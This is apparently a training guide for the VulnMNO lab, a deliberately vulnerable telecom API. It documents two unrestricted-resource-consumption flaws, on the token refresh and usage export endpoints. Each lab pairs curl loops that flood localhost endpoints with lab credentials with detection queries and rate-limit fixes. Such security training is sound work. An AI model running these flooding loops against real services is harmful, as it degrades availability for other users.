# API4 — Unrestricted Resource Consumption · VulnMNO Pentest Guide

This guide documents **pre-existing** API4 weaknesses that ship with the
current VulnMNO backend. No code is added for these labs — the gaps are
already present and catalogued here so trainees can practise locating,
exploiting and remediating them.

> **Scope.** Backend only, pure HTTP. Needs a valid customer JWT (any seed
> customer, e.g. `+34600000001` / `secret123`) but no mobile client.

OWASP API Security reference: **API4:2023 — Unrestricted Resource
Consumption.** Two labs:

| Lab | Subcategory | Severity | Difficulty |
|---|---|---|---|
| L1 | `/api/auth/refresh` has no rate limit | Medium | Easy |
| L2 | `/api/usage/export` has no size cap / no rate limit | Medium | Easy |

---

## L1 — Unthrottled token refresh

### Where it lives

- **Endpoint:** `POST /api/auth/refresh` · body `{"refreshToken"}`
- **Code:** `app/routers/auth.py:66-71`, `app/services/auth.py::refresh`

### Why it is API4

Compare with `/login`:

```python
@router.post("/login", response_model=Union[TokenPair, OtpChallenge])
@limiter.limit("5/minute")           # <-- login IS throttled
async def login(...): ...

@router.post("/refresh", response_model=TokenPair)
async def refresh(...): ...           # <-- NO @limiter at all
```

`services/auth.py::refresh` does the right thing *logically* — it validates
the token hash, checks expiry, and on reuse of an already-rotated token it
revokes the entire refresh chain (`_revoke_chain`, `services/auth.py:121-124`).
That reuse-detection makes credential-stuffing infeasible here (a stolen,
already-used token just gets caught). The actual API4 problem is **volume**,
not guessing: each call does at least two DB round-trips (lookup + rotate +
reissue), and nothing caps how often a caller — with a still-valid,
not-yet-rotated refresh token — can hit this route. `app/rate_limit.py`'s
`Limiter` has no `default_limits`, so there is no global backstop either.

### How to find it (static analysis)

```bash
grep -n "@limiter.limit\|@router.post" src/backend/app/routers/auth.py
grep -n "default_limits" src/backend/app/rate_limit.py   # nothing — confirms no global backstop
```

### Dynamic exploitation

```bash
# 1) Get a valid refresh token
TOKEN=$(curl -s -X POST http://localhost:8000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"msisdn":"+34600000001","password":"secret123"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["refreshToken"])')

# 2) Hammer /refresh — each call rotates and reissues, no 429 ever comes back
for i in $(seq 1 500); do
  RESP=$(curl -s -o /dev/null -w '%{http_code}' -X POST http://localhost:8000/api/auth/refresh \
    -H 'Content-Type: application/json' -d "{\"refreshToken\":\"$TOKEN\"}")
  echo "$i: $RESP"
done
```

Watch backend CPU / DB connection count climb with no `429` anywhere in the
run — that absence is the finding.

### Blue-team detection

```sql
-- Abnormally high refresh-chain churn for one customer in a short window
SELECT customer_id, COUNT(*) AS rotations
FROM refresh_tokens
WHERE revoked_reason = 'rotated' AND revoked_at > NOW() - INTERVAL '5 minutes'
GROUP BY customer_id
HAVING COUNT(*) > 50;
```

### Remediation diff (sketch — not applied)

```diff
--- a/app/routers/auth.py
+++ b/app/routers/auth.py
@@
+@limiter.limit("30/minute")
 async def refresh(...): ...
```

---

## L2 — Unbounded usage export

### Where it lives

- **Endpoint:** `GET /api/usage/export?format=csv|json&from=...&to=...`
- **Code:** `app/routers/usage.py:137-150`

### Why it is API4

Every other usage-listing endpoint in the same file bounds its page size:

```python
@router.get("/calls", ...)
async def usage_calls(..., limit: int = Query(20, ge=1, le=100), ...): ...
```

`export_usage` takes no `limit` parameter at all — it streams **every**
matching record for the given (optional) date range in one response, and
carries no `@limiter.limit(...)` either. A caller who omits `from`/`to`
entirely gets the customer's full usage history in a single unbounded
request, repeatable with no cooldown.

### How to find it (static analysis)

```bash
grep -n "Query(" src/backend/app/routers/usage.py
```

`export_usage`'s signature is the only one in the file with no `Query(20, ge=1, le=100)`-shaped `limit`.

### Dynamic exploitation

```bash
# No date range, no limit — pulls the whole history, repeatable at will
for i in $(seq 1 100); do
  curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \
    "http://localhost:8000/api/usage/export?format=csv" \
    -H "Authorization: Bearer $ACCESS_TOKEN"
done
```

Watch response size and backend latency; against a seeded account with a
large usage history this degrades noticeably, and nothing ever throttles it.

### Blue-team detection

```bash
# Backend access logs: repeated /usage/export hits from the same subject
grep "/api/usage/export" access.log | awk '{print $NF}' | sort | uniq -c | sort -rn
```

### Remediation diff (sketch — not applied)

```diff
--- a/app/routers/usage.py
+++ b/app/routers/usage.py
@@
+@limiter.limit("5/minute")
 async def export_usage(
     customer: ...,
     session: ...,
     format: Literal["csv", "json"] = Query(...),
     from_: datetime | None = Query(default=None, alias="from"),
     to: datetime | None = None,
+    limit: int = Query(10_000, ge=1, le=50_000),
 ):
```
